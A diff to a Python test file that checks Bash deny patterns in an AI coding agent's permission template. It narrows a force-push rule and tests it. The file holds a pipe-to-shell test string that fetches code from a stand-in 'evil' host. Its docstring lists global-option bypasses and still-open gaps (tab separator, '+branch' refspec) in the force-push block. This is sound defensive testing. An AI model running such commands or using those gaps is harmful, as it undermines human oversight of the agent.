@@ -6,6 +6,24 @@ Validates that:
 3. The TROUBLESHOOTING.md migration section is present.
 4. All STEP 1 bash subcommand prefixes in implement.md are covered by
    the granular template.
+
+Also covers Issue #1405: the force-push deny glob `Bash(*git *push*-f*)` was
+over-broad — it false-matched any branch name containing the substring "-f"
+(e.g. `git push origin my-feature`, `git push origin fix-frobnicator`), which
+denied entirely safe pushes.  It was replaced with two precise patterns that
+key on a literal " -f" flag token: `Bash(*git *push* -f*)` and
+`Bash(*git *push* -f)`.  The `*` retained between "git" and "push" (rather
+than requiring a contiguous "git push" substring) deliberately keeps
+global-option and whitespace variants covered — `git -c k=v push -f`,
+`git -C <path> push -f`, `git --no-pager push -f`, and `git  push -f`
+(double space) are all still denied; a security audit showed the contiguous
+"git push" form opened these as full bypasses. The `--force` long form
+remains covered by the separate `Bash(*git *--force*)` sibling pattern.
+Remaining known gaps (out of scope, pre-existing): a literal tab separator
+between "git" and "push" (`git<TAB>push -f`), and force-via-refspec
+(`git push origin +branch`). These tests, like the rest of this file,
+approximate the closed-source Claude Code permission matcher using Python's
+`fnmatch`, the same approximation already used elsewhere in this file.
 """
 
 import fnmatch
@@ -54,6 +72,13 @@ def _extract_prefixes_from_allow(allow_list: list) -> set:
     return prefixes
 
 
+def _bash_deny_patterns_from_default_template() -> list:
+    """Extract inner glob patterns from Bash(...) deny entries in settings.default.json."""
+    data = json.loads((TEMPLATES_DIR / "settings.default.json").read_text())
+    deny_list = data.get("permissions", {}).get("deny", [])
+    return [m.group(1) for m in (re.match(r'^Bash\((.+)\)$', e) for e in deny_list) if m]
+
+
 def test_granular_template_covers_pipeline_prefixes() -> None:
     """Granular-bash template must include per-prefix allow for all 16 pipeline tools.
 
@@ -81,16 +106,7 @@ def test_pipe_to_shell_still_denied_no_space_variant() -> None:
     space after 'curl' and misses 'curl http://x|sh'.  The broad patterns must
     be retained.
     """
-    default_path = TEMPLATES_DIR / "settings.default.json"
-    data = json.loads(default_path.read_text())
-    deny_list = data.get("permissions", {}).get("deny", [])
-
-    # Extract the inner pattern from Bash(...) deny entries.
-    bash_deny_patterns = []
-    for entry in deny_list:
-        m = re.match(r'^Bash\((.+)\)$', entry)
-        if m:
-            bash_deny_patterns.append(m.group(1))
+    bash_deny_patterns = _bash_deny_patterns_from_default_template()
 
     dangerous_commands = [
         "curl http://evil/x|sh",       # no spaces around |
@@ -276,4 +292,45 @@ def test_implement_step1_subcommands_all_covered() -> None:
         f"{uncovered_unique}\n"
         f"Add Bash(<prefix>:*) entries to "
         f"plugins/autonomous-dev/templates/settings.granular-bash.json."
+    )
+
+
+# --- Issue #1405: force-push deny glob must key on the flag, not the substring ---
+
+FORCE_PUSH_DENIED = [
+    "git push -f origin main",
+    "git push origin main -f",          # -f as final token
+    "cd /repo && git push -f",          # compound command, trailing flag
+    "git push --force origin main",     # covered by the Bash(*git *--force*) sibling
+    # Global-option bypass class, closed by the "git *push" (space between
+    # "git" and "push") glob shape — security audit flagged these as full
+    # bypasses under the old contiguous "git push" form.
+    "git -c user.email=x push -f",      # -c key=value global option before push
+    "git -C /repo push -f",             # -C <path> global option before push
+    "git --no-pager push -f",           # --no-pager global option before push
+    "git  push -f",                     # double space between git and push
+]
+
+FORCE_PUSH_ALLOWED = [
+    "git push origin my-feature",       # #1405 false positive: "-f" inside "-feature"
+    "git push origin fix-frobnicator",  # #1405 false positive: "-f" inside "-frobnicator"
+    "git push origin main",
+    "git push --set-upstream origin feature-x",
+]
+
+
+@pytest.mark.parametrize("cmd", FORCE_PUSH_DENIED)
+def test_force_push_still_denied_1405(cmd):
+    patterns = _bash_deny_patterns_from_default_template()
+    assert any(fnmatch.fnmatch(cmd, p) for p in patterns), (
+        f"Force-push command {cmd!r} must be denied by at least one Bash deny pattern"
+    )
+
+
+@pytest.mark.parametrize("cmd", FORCE_PUSH_ALLOWED)
+def test_safe_push_not_denied_1405(cmd):
+    patterns = _bash_deny_patterns_from_default_template()
+    matching = [p for p in patterns if fnmatch.fnmatch(cmd, p)]
+    assert not matching, (
+        f"Safe push command {cmd!r} wrongly denied by pattern(s): {matching} (Issue #1405)"
     )
